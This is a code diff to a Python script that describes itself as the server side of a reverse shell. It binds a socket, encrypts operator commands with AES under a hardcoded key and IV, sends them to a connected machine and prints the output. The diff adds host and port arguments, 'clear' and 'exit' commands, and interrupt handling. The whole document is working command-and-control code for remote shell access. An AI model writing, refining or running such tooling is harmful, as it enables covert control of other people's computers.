@@ -1,12 +1,21 @@
 #!/usr/bin/env python3
+import os
 import socket
+import argparse
 from Crypto.Cipher import AES
 
-bind_host = '0.0.0.0'
-host_port = '1776'
 aes_key = '8ZT%a*SJxTD*f6#8C6BfpHmf#DcE5^qH'
 aes_iv = 'sPqapxT*4vZXjZ$w'
 aes_bs = 64
+
+parser = argparse.ArgumentParser(description="Python reverse shell server-side")
+parser.add_argument('--host', help='IP address to bind to', metavar='IP', default='0.0.0.0')
+parser.add_argument('--port', help='Port to bind to', metavar='PORT', default='1776')
+
+args = parser.parse_args()
+
+bind_host = args.host
+host_port = args.port
 
 def server(port):
     serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -43,6 +52,10 @@ def receive(key, iv, serversocket):
 def rev_shell(key, iv, bs, connection):
     while True:
         command = input('$ ')
+        if command == 'clear':
+            os.system('clear')
+        elif command == 'exit':
+            break
         command = do_encrypt(key, iv, bs, command)
         connection.send(command)
         data = connection.recv(2048)
@@ -53,10 +66,12 @@ def rev_shell(key, iv, bs, connection):
 
 def main(port, key, iv, bs):
     serversocket = server(port)
-    while True:
-        receive(key, iv, serversocket)
-        rev_shell(key, iv, bs, connection)
-
+    try:
+        while True:
+            receive(key, iv, serversocket)
+            rev_shell(key, iv, bs, connection)
+    except KeyboardInterrupt:
+        print('Interrupted')
 
 if __name__ == '__main__':
     main(host_port, aes_key, aes_iv, aes_bs)
